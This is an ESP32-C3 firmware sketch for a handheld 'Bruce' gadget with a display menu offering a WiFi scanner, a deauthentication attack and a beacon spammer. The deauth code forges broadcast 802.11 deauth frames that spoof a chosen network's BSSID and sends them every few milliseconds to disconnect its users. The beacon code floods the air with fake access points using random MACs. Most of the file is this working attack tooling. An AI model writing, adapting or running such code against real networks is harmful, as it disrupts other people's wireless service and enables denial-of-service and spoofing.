/*
 * Bruce Gadget для ESP32-C3 SuperMini
 * WiFi Scanner, Deauth Attack, Beacon Spammer
 * Дисплей: ST7735 160x80 (INITR_MINI160x80)
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <WiFi.h>
#include "esp_wifi.h"

// ===== ПІНИ ДИСПЛЕЮ =====
#define TFT_CS   5
#define TFT_DC   6
#define TFT_RST  7
#define TFT_SCK  8
#define TFT_MOSI 10

// ===== ПІНИ КНОПОК =====
#define BTN_UP   1
#define BTN_DOWN 20
#define BTN_SEL  3
#define BTN_BACK 0

// ===== КОЛЬОРИ (стиль Bruce) =====
#define CLR_BG       ST77XX_BLACK
#define CLR_HEADER   ST77XX_CYAN
#define CLR_SELECT   ST77XX_YELLOW
#define CLR_TEXT     ST77XX_WHITE
#define CLR_DANGER   ST77XX_RED
#define CLR_SUCCESS  0x07E0  // зелений
#define CLR_DIM      0x4208  // темно-сірий
#define CLR_ACCENT   0xFD20  // помаранчевий

// ===== РОЗМІРИ ДИСПЛЕЮ =====
#define SCREEN_W  160
#define SCREEN_H  80
#define HEADER_H  14
#define FOOTER_H  11
#define ITEM_H    11
#define CONTENT_Y (HEADER_H + 2)
#define CONTENT_H (SCREEN_H - HEADER_H - FOOTER_H - 4)
#define VISIBLE_ITEMS (CONTENT_H / ITEM_H)  // ~5

// ===== СТАНИ ДОДАТКУ =====
enum AppState {
  STATE_MAIN_MENU,
  STATE_WIFI_SCAN,
  STATE_WIFI_LIST,
  STATE_DEAUTH,
  STATE_BEACON_MENU,
  STATE_BEACON_RUN,
  STATE_SETTINGS
};

// ===== ГЛОБАЛЬНІ ЗМІННІ =====
Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);

AppState currentState = STATE_MAIN_MENU;

// Меню
int menuCursor   = 0;  // індекс виділеного елементу
int menuScroll   = 0;  // зсув скролу
int menuSize     = 0;  // кількість елементів

// WiFi
#define MAX_NETWORKS 20
struct WifiNet {
  char ssid[33];
  int  channel;
  int  rssi;
  uint8_t bssid[6];
};
WifiNet networks[MAX_NETWORKS];
int networkCount = 0;
int selectedNet  = -1;

// Deauth
bool deauthRunning = false;
unsigned long deauthCount = 0;
unsigned long lastDeauth  = 0;

// Beacon
#define BEACON_SSID_COUNT 8
const char* beaconSSIDs[] = {
  "FBI Surveillance Van",
  "CIA Operations",
  "NSA Mobile Unit",
  "Get Your Own WiFi",
  "Virus.exe",
  "Not Your Network",
  "SkyNet Node 1",
  "Free_5G_COVID"
};
bool beaconRunning    = false;
unsigned long beaconCount = 0;
unsigned long lastBeacon  = 0;
int beaconSelected    = 0;

// Кнопки
unsigned long lastBtnTime[4] = {0, 0, 0, 0};
#define DEBOUNCE_MS 170

// Прототипи функцій
void drawHeader(const char* title);
void drawFooter(const char* hints);
void drawMainMenu();
void drawWifiScanScreen();
void drawWifiList();
void drawDeauthScreen();
void drawBeaconMenu();
void drawBeaconRun();
void drawScrollList(const char** items, int count, int cursor, int scroll, int y, int maxVisible);
void handleNavigation();
bool btnPressed(int pin, int idx);
void doWifiScan();
void sendDeauthPacket(uint8_t* bssid, uint8_t* client);
void sendBeaconPacket(const char* ssid);
void startDeauth();
void stopDeauth();
void startBeacon();
void stopBeacon();
String rssiToBar(int rssi);

// ===== МАЛЮВАННЯ ІНТЕРФЕЙСУ =====

void drawHeader(const char* title) {
  tft.fillRect(0, 0, SCREEN_W, HEADER_H, CLR_HEADER);
  tft.setTextColor(CLR_BG);
  tft.setTextSize(1);
  // Центруємо заголовок
  int len = strlen(title);
  int x = (SCREEN_W - len * 6) / 2;
  tft.setCursor(x, 3);
  tft.print(title);
}

void drawFooter(const char* hints) {
  int y = SCREEN_H - FOOTER_H;
  tft.fillRect(0, y, SCREEN_W, FOOTER_H, 0x1082);
  tft.setTextColor(CLR_DIM);
  tft.setTextSize(1);
  tft.setCursor(2, y + 2);
  tft.print(hints);
}

void drawScrollList(const char** items, int count, int cursor, int scroll, int startY, int maxVisible) {
  for (int i = 0; i < maxVisible; i++) {
    int idx = scroll + i;
    if (idx >= count) break;
    int y = startY + i * ITEM_H;
    if (idx == cursor) {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
      tft.setTextColor(CLR_BG);
    } else {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
      tft.setTextColor(CLR_TEXT);
    }
    tft.setTextSize(1);
    tft.setCursor(4, y + 2);
    tft.print(items[idx]);
  }
}

// ===== ГОЛОВНЕ МЕНЮ =====
const char* mainMenuItems[] = {
  " WiFi Scanner",
  " Deauth Attack",
  " Beacon Spam",
  " Settings"
};
const int MAIN_MENU_SIZE = 4;

void drawMainMenu() {
  tft.fillScreen(CLR_BG);
  drawHeader("[ BRUCE v1.0 ]");

  for (int i = 0; i < MAIN_MENU_SIZE; i++) {
    int idx = menuScroll + i;
    if (idx >= MAIN_MENU_SIZE) break;
    int y = CONTENT_Y + i * ITEM_H;

    if (idx == menuCursor) {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
      tft.setTextColor(CLR_BG);
    } else {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
      tft.setTextColor(CLR_TEXT);
    }
    tft.setTextSize(1);
    tft.setCursor(6, y + 2);
    // Іконки
    switch(idx) {
      case 0: tft.setTextColor(idx == menuCursor ? CLR_BG : 0x07FF); break;
      case 1: tft.setTextColor(idx == menuCursor ? CLR_BG : CLR_DANGER); break;
      case 2: tft.setTextColor(idx == menuCursor ? CLR_BG : CLR_ACCENT); break;
      case 3: tft.setTextColor(idx == menuCursor ? CLR_BG : CLR_DIM); break;
    }
    tft.print(mainMenuItems[idx]);
  }

  // Смуга прокрутки
  if (MAIN_MENU_SIZE > VISIBLE_ITEMS) {
    int barH = CONTENT_H * VISIBLE_ITEMS / MAIN_MENU_SIZE;
    int barY = CONTENT_Y + CONTENT_H * menuScroll / MAIN_MENU_SIZE;
    tft.fillRect(SCREEN_W - 3, CONTENT_Y, 3, CONTENT_H, CLR_DIM);
    tft.fillRect(SCREEN_W - 3, barY, 3, barH, CLR_HEADER);
  }

  drawFooter("UP/DN:nav  SEL:select");
}

// ===== WiFi СКАНЕР =====
void drawWifiScanScreen() {
  tft.fillScreen(CLR_BG);
  drawHeader("[ WiFi SCAN ]");
  tft.setTextColor(CLR_HEADER);
  tft.setTextSize(1);
  tft.setCursor(20, 30);
  tft.print("Scanning...");
  tft.setCursor(10, 45);
  tft.setTextColor(CLR_DIM);
  tft.print("Please wait");
  drawFooter("");
}

void doWifiScan() {
  drawWifiScanScreen();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks(false, true, false, 200);
  networkCount = 0;

  if (n > 0) {
    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
      strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 32);
      networks[i].ssid[32] = 0;
      networks[i].channel  = WiFi.channel(i);
      networks[i].rssi     = WiFi.RSSI(i);
      memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
      networkCount++;
    }
  }

  WiFi.scanDelete();
  menuCursor = 0;
  menuScroll = 0;
  menuSize   = networkCount;
  currentState = STATE_WIFI_LIST;
  drawWifiList();
}

void drawWifiList() {
  tft.fillScreen(CLR_BG);
  drawHeader("[ WiFi LIST ]");

  if (networkCount == 0) {
    tft.setTextColor(CLR_DANGER);
    tft.setTextSize(1);
    tft.setCursor(20, 35);
    tft.print("No networks found!");
    drawFooter("BACK:back");
    return;
  }

  int visible = min(VISIBLE_ITEMS, networkCount);
  for (int i = 0; i < visible; i++) {
    int idx = menuScroll + i;
    if (idx >= networkCount) break;
    int y = CONTENT_Y + i * ITEM_H;

    bool selected = (idx == menuCursor);
    if (selected) {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
      tft.setTextColor(CLR_BG);
    } else {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
      // Колір по силі сигналу
      if (networks[idx].rssi > -60)      tft.setTextColor(CLR_SUCCESS);
      else if (networks[idx].rssi > -80) tft.setTextColor(CLR_ACCENT);
      else                               tft.setTextColor(CLR_DIM);
    }
    tft.setTextSize(1);
    tft.setCursor(2, y + 2);

    // SSID обрізаємо до 18 символів
    char line[32];
    char shortSSID[19];
    strncpy(shortSSID, networks[idx].ssid, 18);
    shortSSID[18] = 0;
    snprintf(line, sizeof(line), "%s [%d]", shortSSID, networks[idx].channel);
    tft.print(line);
  }

  // Скролбар
  if (networkCount > VISIBLE_ITEMS) {
    int barH = max(4, CONTENT_H * VISIBLE_ITEMS / networkCount);
    int barY = CONTENT_Y + (CONTENT_H - barH) * menuScroll / max(1, networkCount - VISIBLE_ITEMS);
    tft.fillRect(SCREEN_W - 3, CONTENT_Y, 3, CONTENT_H, CLR_DIM);
    tft.fillRect(SCREEN_W - 3, barY, 3, barH, CLR_HEADER);
  }

  drawFooter("UP/DN:nav SEL:deauth BK:back");
}

// ===== DEAUTH =====
void drawDeauthScreen() {
  tft.fillScreen(CLR_BG);
  drawHeader("[ DEAUTH ]");

  if (selectedNet < 0 || selectedNet >= networkCount) return;

  // Назва мережі
  tft.setTextColor(CLR_HEADER);
  tft.setTextSize(1);
  tft.setCursor(2, CONTENT_Y + 2);
  char shortSSID[22];
  strncpy(shortSSID, networks[selectedNet].ssid, 21);
  shortSSID[21] = 0;
  tft.print(shortSSID);

  // BSSID
  tft.setTextColor(CLR_DIM);
  tft.setCursor(2, CONTENT_Y + 13);
  char bssidStr[20];
  uint8_t* b = networks[selectedNet].bssid;
  snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           b[0], b[1], b[2], b[3], b[4], b[5]);
  tft.print(bssidStr);

  // Статус
  if (deauthRunning) {
    tft.setTextColor(CLR_DANGER);
    tft.setCursor(2, CONTENT_Y + 26);
    tft.print(">>> ATTACKING <<<");
    tft.setTextColor(CLR_TEXT);
    tft.setCursor(2, CONTENT_Y + 38);
    char cntStr[24];
    snprintf(cntStr, sizeof(cntStr), "Pkts: %lu", deauthCount);
    tft.print(cntStr);
  } else {
    tft.setTextColor(CLR_SUCCESS);
    tft.setCursor(2, CONTENT_Y + 26);
    tft.print("Ready. SEL to start");
  }

  drawFooter(deauthRunning ? "SEL:stop  BACK:back" : "SEL:start BACK:back");
}

// Deauth пакет (802.11 deauthentication frame)
uint8_t deauthPacket[26] = {
  0xC0, 0x00,             // Frame Control: deauth
  0x3A, 0x01,             // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0xF0, 0xFF,             // Sequence
  0x07, 0x00              // Reason: Class 3 frame
};

void sendDeauthPacket(uint8_t* bssid) {
  // Встановлюємо BSSID у пакет
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);

  esp_wifi_set_channel(networks[selectedNet].channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  // Також на AP інтерфейс
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

void startDeauth() {
  if (selectedNet < 0) return;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_start();
  deauthRunning = true;
  deauthCount   = 0;
  drawDeauthScreen();
}

void stopDeauth() {
  deauthRunning = false;
  WiFi.mode(WIFI_STA);
  drawDeauthScreen();
}

// ===== BEACON SPAMMER =====
void drawBeaconMenu() {
  tft.fillScreen(CLR_BG);
  drawHeader("[ BEACON SPAM ]");

  int visible = min(VISIBLE_ITEMS, BEACON_SSID_COUNT);
  for (int i = 0; i < visible; i++) {
    int idx = menuScroll + i;
    if (idx >= BEACON_SSID_COUNT) break;
    int y = CONTENT_Y + i * ITEM_H;

    if (idx == menuCursor) {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
      tft.setTextColor(CLR_BG);
    } else {
      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
      tft.setTextColor(CLR_ACCENT);
    }
    tft.setTextSize(1);
    tft.setCursor(4, y + 2);
    tft.print(beaconSSIDs[idx]);
  }

  drawFooter("UP/DN:nav SEL:start BK:back");
}

void drawBeaconRun() {
  tft.fillScreen(CLR_BG);
  drawHeader("[ BEACONING ]");

  tft.setTextColor(CLR_ACCENT);
  tft.setTextSize(1);
  tft.setCursor(2, CONTENT_Y + 2);
  tft.print(beaconSSIDs[beaconSelected]);

  tft.setTextColor(CLR_DANGER);
  tft.setCursor(2, CONTENT_Y + 15);
  tft.print(">>> SPAMMING <<<");

  tft.setTextColor(CLR_TEXT);
  tft.setCursor(2, CONTENT_Y + 28);
  char cntStr[24];
  snprintf(cntStr, sizeof(cntStr), "Pkts sent: %lu", beaconCount);
  tft.print(cntStr);

  drawFooter("SEL:stop  BACK:back");
}

// Beacon frame
void sendBeaconPacket(const char* ssid) {
  uint8_t ssidLen = strlen(ssid);

  // Випадковий MAC
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
  mac[0] = (mac[0] & 0xFE) | 0x02; // локальний MAC

  uint8_t pkt[100];
  memset(pkt, 0, sizeof(pkt));
  int pos = 0;

  // Frame control: beacon
  pkt[pos++] = 0x80; pkt[pos++] = 0x00;
  // Duration
  pkt[pos++] = 0x00; pkt[pos++] = 0x00;
  // Destination: broadcast
  memset(&pkt[pos], 0xFF, 6); pos += 6;
  // Source: випадковий MAC
  memcpy(&pkt[pos], mac, 6); pos += 6;
  // BSSID: той самий MAC
  memcpy(&pkt[pos], mac, 6); pos += 6;
  // Sequence
  pkt[pos++] = 0x00; pkt[pos++] = 0x00;
  // Timestamp (8 байт)
  uint64_t ts = esp_timer_get_time();
  memcpy(&pkt[pos], &ts, 8); pos += 8;
  // Beacon interval
  pkt[pos++] = 0x64; pkt[pos++] = 0x00;
  // Capabilities
  pkt[pos++] = 0x01; pkt[pos++] = 0x04;
  // SSID IE
  pkt[pos++] = 0x00;
  pkt[pos++] = ssidLen;
  memcpy(&pkt[pos], ssid, ssidLen); pos += ssidLen;
  // Supported rates IE
  pkt[pos++] = 0x01; pkt[pos++] = 0x08;
  pkt[pos++] = 0x82; pkt[pos++] = 0x84;
  pkt[pos++] = 0x8B; pkt[pos++] = 0x96;
  pkt[pos++] = 0x24; pkt[pos++] = 0x30;
  pkt[pos++] = 0x48; pkt[pos++] = 0x6C;
  // DS Parameter (канал)
  pkt[pos++] = 0x03; pkt[pos++] = 0x01;
  pkt[pos++] = 1 + random(0, 11);

  esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
}

void startBeacon() {
  beaconSelected = menuCursor;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  beaconRunning = true;
  beaconCount   = 0;
  currentState  = STATE_BEACON_RUN;
  drawBeaconRun();
}

void stopBeacon() {
  beaconRunning = false;
  WiFi.mode(WIFI_STA);
  currentState = STATE_BEACON_MENU;
  menuCursor   = beaconSelected;
  menuScroll   = 0;
  menuSize     = BEACON_SSID_COUNT;
  drawBeaconMenu();
}

// ===== КНОПКИ =====
bool btnPressed(int pin, int idx) {
  if (millis() - lastBtnTime[idx] < DEBOUNCE_MS) return false;
  if (digitalRead(pin) == LOW) {
    lastBtnTime[idx] = millis();
    return true;
  }
  return false;
}

// ===== НАВІГАЦІЯ =====
void handleNavigation() {
  bool up   = btnPressed(BTN_UP,   0);
  bool down = btnPressed(BTN_DOWN, 1);
  bool sel  = btnPressed(BTN_SEL,  2);
  bool back = btnPressed(BTN_BACK, 3);

  // Оновлення лічильників у активних режимах
  if (deauthRunning && currentState == STATE_DEAUTH) {
    if (millis() - lastDeauth > 5) {
      sendDeauthPacket(networks[selectedNet].bssid);
      deauthCount++;
      lastDeauth = millis();
      // Оновлюємо лічильник на екрані
      tft.setTextColor(CLR_TEXT);
      tft.fillRect(2, CONTENT_Y + 38, 120, 10, CLR_BG);
      tft.setCursor(2, CONTENT_Y + 38);
      char cntStr[24];
      snprintf(cntStr, sizeof(cntStr), "Pkts: %lu", deauthCount);
      tft.print(cntStr);
    }
  }

  if (beaconRunning && currentState == STATE_BEACON_RUN) {
    if (millis() - lastBeacon > 50) {
      sendBeaconPacket(beaconSSIDs[beaconSelected]);
      beaconCount++;
      lastBeacon = millis();
      // Оновлюємо лічильник
      tft.setTextColor(CLR_TEXT);
      tft.fillRect(2, CONTENT_Y + 28, 140, 10, CLR_BG);
      tft.setCursor(2, CONTENT_Y + 28);
      char cntStr[24];
      snprintf(cntStr, sizeof(cntStr), "Pkts sent: %lu", beaconCount);
      tft.print(cntStr);
    }
  }

  if (!up && !down && !sel && !back) return;

  switch (currentState) {

    // ===== ГОЛОВНЕ МЕНЮ =====
    case STATE_MAIN_MENU:
      if (up && menuCursor > 0) {
        menuCursor--;
        if (menuCursor < menuScroll) menuScroll = menuCursor;
        drawMainMenu();
      }
      if (down && menuCursor < MAIN_MENU_SIZE - 1) {
        menuCursor++;
        if (menuCursor >= menuScroll + VISIBLE_ITEMS)
          menuScroll = menuCursor - VISIBLE_ITEMS + 1;
        drawMainMenu();
      }
      if (sel) {
        switch (menuCursor) {
          case 0: // WiFi Scan
            currentState = STATE_WIFI_SCAN;
            doWifiScan();
            break;
          case 1: // Deauth — спочатку скан
            currentState = STATE_WIFI_SCAN;
            doWifiScan();
            break;
          case 2: // Beacon
            menuCursor = 0; menuScroll = 0;
            menuSize   = BEACON_SSID_COUNT;
            currentState = STATE_BEACON_MENU;
            drawBeaconMenu();
            break;
          case 3: // Settings (заглушка)
            tft.fillRect(0, CONTENT_Y, SCREEN_W, CONTENT_H, CLR_BG);
            tft.setTextColor(CLR_DIM);
            tft.setCursor(20, CONTENT_Y + 20);
            tft.print("Coming soon...");
            break;
        }
      }
      break;

    // ===== СПИСОК WiFi =====
    case STATE_WIFI_LIST:
      if (up && menuCursor > 0) {
        menuCursor--;
        if (menuCursor < menuScroll) menuScroll = menuCursor;
        drawWifiList();
      }
      if (down && menuCursor < networkCount - 1) {
        menuCursor++;
        if (menuCursor >= menuScroll + VISIBLE_ITEMS)
          menuScroll = menuCursor - VISIBLE_ITEMS + 1;
        drawWifiList();
      }
      if (sel && networkCount > 0) {
        selectedNet  = menuCursor;
        deauthRunning = false;
        deauthCount   = 0;
        currentState  = STATE_DEAUTH;
        drawDeauthScreen();
      }
      if (back) {
        menuCursor = 0; menuScroll = 0;
        currentState = STATE_MAIN_MENU;
        drawMainMenu();
      }
      break;

    // ===== DEAUTH =====
    case STATE_DEAUTH:
      if (sel) {
        if (deauthRunning) stopDeauth();
        else startDeauth();
      }
      if (back) {
        stopDeauth();
        menuCursor = menuScroll = 0;
        currentState = STATE_WIFI_LIST;
        drawWifiList();
      }
      break;

    // ===== BEACON МЕНЮ =====
    case STATE_BEACON_MENU:
      if (up && menuCursor > 0) {
        menuCursor--;
        if (menuCursor < menuScroll) menuScroll = menuCursor;
        drawBeaconMenu();
      }
      if (down && menuCursor < BEACON_SSID_COUNT - 1) {
        menuCursor++;
        if (menuCursor >= menuScroll + VISIBLE_ITEMS)
          menuScroll = menuCursor - VISIBLE_ITEMS + 1;
        drawBeaconMenu();
      }
      if (sel) startBeacon();
      if (back) {
        menuCursor = 2; menuScroll = 0;
        currentState = STATE_MAIN_MENU;
        drawMainMenu();
      }
      break;

    // ===== BEACON RUN =====
    case STATE_BEACON_RUN:
      if (sel || back) stopBeacon();
      break;

    default: break;
  }
}

// ===== SETUP =====
void setup() {
  // Кнопки
  pinMode(BTN_UP,   INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL,  INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  // SPI і дисплей
  SPI.begin(TFT_SCK, -1, TFT_MOSI);
  tft.initR(INITR_MINI160x80);
  tft.setRotation(1);
  tft.fillScreen(CLR_BG);

  // Splash screen
  tft.setTextColor(CLR_HEADER);
  tft.setTextSize(2);
  tft.setCursor(30, 10);
  tft.print("BRUCE");
  tft.setTextSize(1);
  tft.setTextColor(CLR_DIM);
  tft.setCursor(25, 32);
  tft.print("ESP32-C3 Gadget");

  // Перевірка дисплею
  tft.setTextColor(CLR_SUCCESS);
  tft.setCursor(40, 48);
  tft.print("TFT OK!");

  // Ініціалізація WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  tft.setTextColor(CLR_SUCCESS);
  tft.setCursor(28, 60);
  tft.print("Wi-Fi Ready!");

  delay(1500);

  // Головне меню
  menuCursor = 0;
  menuScroll = 0;
  menuSize   = MAIN_MENU_SIZE;
  drawMainMenu();
}

// ===== LOOP =====
void loop() {
  handleNavigation();
}
